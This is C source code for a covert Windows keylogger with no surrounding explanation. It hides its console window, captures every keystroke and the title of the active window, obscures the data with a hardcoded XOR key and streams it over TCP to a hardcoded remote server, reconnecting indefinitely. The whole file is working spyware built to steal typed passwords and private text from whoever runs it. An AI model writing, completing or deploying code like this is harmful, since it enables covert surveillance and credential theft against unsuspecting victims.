#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdbool.h>
#include <winreg.h>

#pragma comment(lib, "ws2_32.lib")

#define SERVER_IP "192.168.1.71" 
#define SERVER_PORT 8080
#define RETRY_INTERVAL 10000  // 10 minutes in milliseconds
#define APP_NAME "WindowsService"
#define ENCRYPTION_KEY "S3cr3tK3y"

void encryptData(char *data) {
    int key_len = strlen(ENCRYPTION_KEY);
    int data_len = strlen(data);
    for (int i = 0; i < data_len; i++) {
        data[i] = data[i] ^ ENCRYPTION_KEY[i % key_len];
    }
}

SOCKET connectWithRetry() {
    WSADATA wsa;
    SOCKET sock = INVALID_SOCKET;
    struct sockaddr_in server;

    while (1) {
        // Initialize Winsock for each attempt
        if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
            Sleep(RETRY_INTERVAL);
            continue;
        }

        // Create a socket
        if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
            WSACleanup();
            Sleep(RETRY_INTERVAL);
            continue;
        }

        server.sin_family = AF_INET;
        server.sin_port = htons(SERVER_PORT);
        server.sin_addr.s_addr = inet_addr(SERVER_IP);

        // Try to connect
        if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
            closesocket(sock);
            WSACleanup();
            Sleep(RETRY_INTERVAL);
            continue;
        }

        return sock;
    }
}

void logActiveWindow(SOCKET sock) {
    char windowTitle[256];
    HWND foregroundWindow = GetForegroundWindow();

    if (foregroundWindow) {
        GetWindowText(foregroundWindow, windowTitle, sizeof(windowTitle));

        static char lastWindowTitle[256] = "";
        if (strcmp(lastWindowTitle, windowTitle) != 0) {
            char titleBuffer[512];
            sprintf(titleBuffer, "\n[Window: %s]\n", windowTitle);
            
            // Encrypt and send
            char encrypted_data[512];
            strncpy(encrypted_data, titleBuffer, sizeof(encrypted_data) - 1);
            encrypted_data[sizeof(encrypted_data) - 1] = '\0';
            encryptData(encrypted_data);
            send(sock, encrypted_data, strlen(encrypted_data), 0);
            
            strcpy(lastWindowTitle, windowTitle);
        }
    }
}

int main() {
    // Hide the console window
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    SetPriorityClass(GetCurrentProcess(), IDLE_PRIORITY_CLASS);
    SOCKET sock;
    static bool keyState[256] = {0};

    while (1) {
        // Get socket connection with retry
        sock = connectWithRetry();
        
        // Main logging loop
        while (sock != INVALID_SOCKET) {
            logActiveWindow(sock);

            for (int key = 8; key <= 190; key++) {
                if ((GetAsyncKeyState(key) & 0x8000) && !keyState[key]) {
                    char keyStr[20] = {0};

                    if (key >= 65 && key <= 90) {
                        sprintf(keyStr, "%c", key + 32); // Convert to lowercase
                    } else if (key >= 48 && key <= 57) {
                        sprintf(keyStr, "%c", key); // Numbers
                    } else {
                        switch (key) {
                            case VK_SPACE: strcpy(keyStr, " "); break;
                            case VK_RETURN: strcpy(keyStr, "[ENTER]\n"); break;
                            case VK_TAB: strcpy(keyStr, "[TAB]"); break;
                            case VK_LSHIFT: 
                            case VK_RSHIFT: 
                                continue;  // Skip these specific keys
                            case VK_SHIFT: strcpy(keyStr, "[SHIFT]"); break;
                            case VK_BACK: strcpy(keyStr, "\b \b"); break;
                            case VK_ESCAPE: strcpy(keyStr, "[ESC]"); break;
                            case VK_LCONTROL: 
                            case VK_RCONTROL: 
                                continue;  // Skip these specific keys
                            case VK_CONTROL: strcpy(keyStr, "[CTRL]"); break;
                            case VK_LWIN: strcpy(keyStr, "[WIN]"); break;
                            case VK_RWIN: strcpy(keyStr, "[WIN]"); break;
                            case VK_LMENU:
                            case VK_RMENU:
                                continue;  // Skip these specific keys
                            case VK_MENU: strcpy(keyStr, "[ALT]"); break;
                            case VK_CAPITAL: strcpy(keyStr, "[CAPSLOCK]"); break;
                            case VK_DELETE: strcpy(keyStr, "[DELETE]"); break;
                            case VK_INSERT: strcpy(keyStr, "[INSERT]"); break;
                            case VK_HOME: strcpy(keyStr, "[HOME]"); break;
                            case VK_END: strcpy(keyStr, "[END]"); break;
                            case VK_LEFT: strcpy(keyStr, "[LEFT]"); break;
                            case VK_RIGHT: strcpy(keyStr, "[RIGHT]"); break; 
                            case VK_OEM_1: strcpy(keyStr, ";"); break;
                            case VK_OEM_7 : strcpy(keyStr, "'"); break;
                            case VK_OEM_COMMA : strcpy(keyStr, ","); break;
                            case VK_OEM_PERIOD : strcpy(keyStr, "."); break;
                            case VK_OEM_MINUS : strcpy(keyStr, "-"); break;
                            case VK_OEM_PLUS : strcpy(keyStr, "+"); break;
                            case VK_OEM_2 : strcpy(keyStr, "/"); break;
                            case VK_OEM_3 : strcpy(keyStr, "`"); break;
                            case VK_OEM_4 : strcpy(keyStr, "["); break;
                            case VK_OEM_5 : strcpy(keyStr, "\\"); break;
                            case VK_OEM_6 : strcpy(keyStr, "]"); break;
                            case VK_OEM_8 : strcpy(keyStr, "~"); break;
                            case VK_OEM_102 : strcpy(keyStr, "[BACKSLASH]"); break;
                            case VK_NUMPAD0 : strcpy(keyStr, "0"); break;
                            case VK_NUMPAD1 : strcpy(keyStr, "1"); break;
                            case VK_NUMPAD2 : strcpy(keyStr, "2"); break;
                            case VK_NUMPAD3 : strcpy(keyStr, "3"); break;
                            case VK_NUMPAD4 : strcpy(keyStr, "4"); break;
                            case VK_NUMPAD5 : strcpy(keyStr, "5"); break;
                            case VK_NUMPAD6 : strcpy(keyStr, "6"); break;
                            case VK_NUMPAD7 : strcpy(keyStr, "7"); break;
                            case VK_NUMPAD8 : strcpy(keyStr, "8"); break;
                            case VK_NUMPAD9 : strcpy(keyStr, "9"); break;
                            default: strcpy(keyStr, "[OTHER]"); break;
                        }
                    }

                    // Encrypt and send
                    char encrypted_data[1024];
                    strncpy(encrypted_data, keyStr, sizeof(encrypted_data) - 1);
                    encrypted_data[sizeof(encrypted_data) - 1] = '\0';
                    encryptData(encrypted_data);
                    
                    if (send(sock, encrypted_data, strlen(encrypted_data), 0) == SOCKET_ERROR) {
                        closesocket(sock);
                        WSACleanup();
                        sock = INVALID_SOCKET;
                        break;
                    }

                    keyState[key] = true;
                }
                if (!(GetAsyncKeyState(key) & 0x8000)) {
                    keyState[key] = false;
                }
            }
            
            if (sock == INVALID_SOCKET) {
                break;
            }
            
            Sleep(1);
        }

        Sleep(RETRY_INTERVAL);
    }

    return 0;
}